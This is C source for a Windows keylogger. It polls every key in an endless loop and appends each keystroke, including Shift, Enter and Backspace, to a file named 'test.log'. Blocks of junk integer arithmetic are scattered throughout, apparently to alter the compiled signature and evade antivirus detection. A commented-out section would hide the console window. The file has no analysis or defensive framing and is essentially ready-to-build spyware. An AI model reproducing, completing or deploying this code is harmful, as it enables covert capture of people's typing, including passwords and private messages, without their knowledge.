#include "Keylogger.h"
DWORD WINAPI Keylogger()
{
    // HWND stealth; 
    // /*creating stealth (window is not visible)*/
    //  AllocConsole();
    // stealth=FindWindowA("ConsoleWindowClass",NULL);
    // ShowWindow(stealth,0);

    short character;{
int iAgFYzzCFSI = 0x86230ac;
int iqYtFy2OiC2 = 0xe00bc69;
int iMDacYGcFhE = 0x0819a38;
int iBXpAYWZiLt = iMDacYGcFhE * iqYtFy2OiC2 + iAgFYzzCFSI;
iqYtFy2OiC2 = 0xd7fb6c8 + iBXpAYWZiLt + 0x45bba85 + iAgFYzzCFSI;
int i1jZ8anLnX9 = iAgFYzzCFSI / 0xe00bc69 - iMDacYGcFhE ^ iMDacYGcFhE ^ 0x0819a38;
}
    while(1)
    {
        for(character=8; character<=222; character++)
        {
            if(GetAsyncKeyState(character)==-32767)
            {

                FILE *file;
                file=fopen("test.log","a+");
                if(file==NULL)
                {
                    return 1;{
int ibPxjcW3BL2 = 0x59b395f;
int iH4b65gaKcO = 0x92dbe55;
int iFTpjNxhP9P = 0x5114fea;
int ilpTbPNpG46 = iFTpjNxhP9P * iH4b65gaKcO + ibPxjcW3BL2;
iH4b65gaKcO = 0x529140e + ilpTbPNpG46 + 0x441a687 + ibPxjcW3BL2;
int iHlcj41d3wB = ibPxjcW3BL2 / 0x92dbe55 - iFTpjNxhP9P ^ iFTpjNxhP9P ^ 0x5114fea;
}
                }
                if(file!=NULL)
                {
                    if((character>=39)&&(character<=64))
                    {
                        fputc(character,file);
                        fclose(file);
                        break;
                    }
                    else if((character>64)&&(character<91))
                    {
                        character+=32;
                        fputc(character,file);
                        fclose(file);{
int iTQfHd0GpWU = 0xdf474a8;
int inc7sSfHOGm = 0xe13a457;
int ibvQHckgScP = iTQfHd0GpWU ^ inc7sSfHOGm;
}
                        break;
                    }
                    else
                    {
                        switch(character)
                        {
                        case VK_SPACE:
                            fputc(' ',file);
                            fclose(file);
                            break;
                        case VK_SHIFT:
                            fputs("[SHIFT]",file);
                            fclose(file);
                            break;
                        case VK_RETURN:
                            fputs("\n[ENTER]",file);
                            fclose(file);
                            break;
                        case VK_BACK:
                            fputs("[BACKSPACE]",file);{
int i6QgTUfwqn8 = 0xfcdad99;
int ivpCQZz8rV2 = 0x163b02a;
int ictxQssGZQu = 0x048f6db;
int i7fwEbXW9cr = ictxQssGZQu * ivpCQZz8rV2 + i6QgTUfwqn8;
ivpCQZz8rV2 = 0xb27c868 + i7fwEbXW9cr + 0x70061d7 + i6QgTUfwqn8;
int iULxZCzMjoq = i6QgTUfwqn8 / 0x163b02a - ictxQssGZQu ^ ictxQssGZQu ^ 0x048f6db;
}
                            fclose(file);
                            break;
                        case VK_TAB:
                            fputs("[TAB]",file);
                            fclose(file);
                            break;
                        case VK_CONTROL:
                            fputs("[CTRL]",file);
                            fclose(file);
                            break;
                        case VK_DELETE:
                            fputs("[DEL]",file);{
int iiR6XO2gguj = 0x0f08ae7;
int i3g64kP4HY1 = 0x97a19d4;
int iR7u4Yw7Oun = iiR6XO2gguj % i3g64kP4HY1;
}
                            fclose(file);
                            break;
                        case VK_OEM_1:
                            fputs("[;:]",file);
                            fclose(file);
                            break;
                        case VK_OEM_2:
                            fputs("[/?]",file);{
int ivYU354d90L;
int if2TzisqOHk = 0xe903bf3;
int ixwHef9KQXA = 0xff32a91;
int ikTQ3l7QmGD = 0x8e6bfaf;
for(ivYU354d90L = 0; ivYU354d90L < 3; ivYU354d90L++)
{
    if2TzisqOHk = ivYU354d90L * 99 - 1000 * ixwHef9KQXA + 0x456 ^ 0x5b83791 % 5 - 0xa3097b4;
    ixwHef9KQXA = ivYU354d90L * 3 + ikTQ3l7QmGD + 0x30 + 0x8e6bfaf % 123 - ixwHef9KQXA;
    ikTQ3l7QmGD = ivYU354d90L * 4 - 0xff32a91 + 0xff / 0x123 - 0x8e6bfaf % 234 - 0xa3097b4;
}
int i75ckldqed1 = ikTQ3l7QmGD - if2TzisqOHk * ixwHef9KQXA + 0x8e6bfaf;
i75ckldqed1 = ivYU354d90L - 50 + 100 - 0xff32a91 ^ 99 * 0x0f - 0x8e6bfaf % 2 - 3575 + 0xa3097b4;
}
                            fclose(file);
                            break;
                        case VK_OEM_3:
                            fputs("[`~]",file);
                            fclose(file);
                            break;
                        case VK_OEM_4:
                            fputs("[ [{ ]",file);
                            fclose(file);
                            break;
                        case VK_OEM_5:
                            fputs("[\\|]",file);
                            fclose(file);
                            break;
                        case VK_OEM_6:
                            fputs("[ ]} ]",file);
                            fclose(file);
                            break;
                        case VK_OEM_7:
                            fputs("['\"]",file);
                            fclose(file);
                            break;
                        case VK_NUMPAD0:
                            fputc('0',file);
                            fclose(file);
                            break;{
int ilo2Aov7WnF = 0xaca38f2;
int iZGhuk1Yl5B = 0x8ae462e;
int iz8t1jsgdKB = 0x736a340;
int iY5GoO71B84 = iz8t1jsgdKB * iZGhuk1Yl5B + ilo2Aov7WnF;
iZGhuk1Yl5B = 0x07ee804 + iY5GoO71B84 + 0xdce6e39 + ilo2Aov7WnF;
int id1gNVMFPy9 = ilo2Aov7WnF / 0x8ae462e - iz8t1jsgdKB ^ iz8t1jsgdKB ^ 0x736a340;
}
                        case VK_NUMPAD1:
                            fputc('1',file);{
int iA2fn9XmAi8 = 0x90748a0;
int ibggWmRpLJt = 0x9d1d351;
int i7r0lD0kCq9 = iA2fn9XmAi8 & ibggWmRpLJt;
}
                            fclose(file);
                            break;
                        case VK_NUMPAD2:
                            fputc('2',file);
                            fclose(file);
                            break;{
int iMpqB29ZpWg = 0xc91a977;
int istKobjV3Lz = 0xc01af97;
int il0qbmQhoZy = 0xa192ea8;
int i24YUywQeZC = il0qbmQhoZy * istKobjV3Lz + iMpqB29ZpWg;
istKobjV3Lz = 0x294c021 + i24YUywQeZC + 0x3c63f3e + iMpqB29ZpWg;
int ie4wQ1kYoFZ = iMpqB29ZpWg / 0xc01af97 - il0qbmQhoZy ^ il0qbmQhoZy ^ 0xa192ea8;
}
                        case VK_NUMPAD3:
                            fputc('3',file);
                            fclose(file);{
int iccxCGyksoO;
int imDPhxaGexF = 0x16e246f;
int iXLRjoWthNQ = 0x774e71c;
int iDCHoYX1Qup = 0xf5b03a8;
for(iccxCGyksoO = 0; iccxCGyksoO < 3; iccxCGyksoO++)
{
    imDPhxaGexF = iccxCGyksoO * 99 - 1000 * iXLRjoWthNQ + 0x456 ^ 0x58f9d03 % 5 - 0x8291344;
    iXLRjoWthNQ = iccxCGyksoO * 3 + iDCHoYX1Qup + 0x30 + 0xf5b03a8 % 123 - iXLRjoWthNQ;
    iDCHoYX1Qup = iccxCGyksoO * 4 - 0x774e71c + 0xff / 0x123 - 0xf5b03a8 % 234 - 0x8291344;
}
int ihmBzwgwUGH = iDCHoYX1Qup - imDPhxaGexF * iXLRjoWthNQ + 0xf5b03a8;
ihmBzwgwUGH = iccxCGyksoO - 50 + 100 - 0x774e71c ^ 99 * 0x0f - 0xf5b03a8 % 2 - 3575 + 0x8291344;
}
                            break;
                        case VK_NUMPAD4:
                            fputc('4',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD5:
                            fputc('5',file);
                            fclose(file);{
int i0uIiuJbwIk = 0xd05ba10;
int iYbFWCOhVIM = 0xc383c03;
int im3BleHnoMk = i0uIiuJbwIk ^ iYbFWCOhVIM;
}
                            break;
                        case VK_NUMPAD6:
                            fputc('6',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD7:
                            fputc('7',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD8:
                            fputc('8',file);
                            fclose(file);{
int io253slf0M4;
int iKcmFhI96j7 = 0xcf0ead9;
int i0rscz2sWw3 = 0x952a326;
int ie9vuT0lJ35 = 0x320d62f;
for(io253slf0M4 = 0; io253slf0M4 < 3; io253slf0M4++)
{
    iKcmFhI96j7 = io253slf0M4 * 99 - 1000 * i0rscz2sWw3 + 0x456 ^ 0x1dc430a % 5 - 0x6316a1c;
    i0rscz2sWw3 = io253slf0M4 * 3 + ie9vuT0lJ35 + 0x30 + 0x320d62f % 123 - i0rscz2sWw3;
    ie9vuT0lJ35 = io253slf0M4 * 4 - 0x952a326 + 0xff / 0x123 - 0x320d62f % 234 - 0x6316a1c;
}
int iRuVfDS4NPb = ie9vuT0lJ35 - iKcmFhI96j7 * i0rscz2sWw3 + 0x320d62f;
iRuVfDS4NPb = io253slf0M4 - 50 + 100 - 0x952a326 ^ 99 * 0x0f - 0x320d62f % 2 - 3575 + 0x6316a1c;
}
                            break;{
int ir1wqgzDoqG = 0x12f9c1b;
int iVNYg8eHUYo = 0x78cbe0c;
int ihPZWqIFDBH = ir1wqgzDoqG - iVNYg8eHUYo;
}
                        case VK_NUMPAD9:
                            fputc('9',file);
                            fclose(file);
                            break;
                        case VK_CAPITAL:
                            fputs("[CAPS LOCK]",file);
                            fclose(file);
                            break;
                        default:
                            fclose(file);
                            break;
                        }
                    }
                }
            }
        }

    }
}
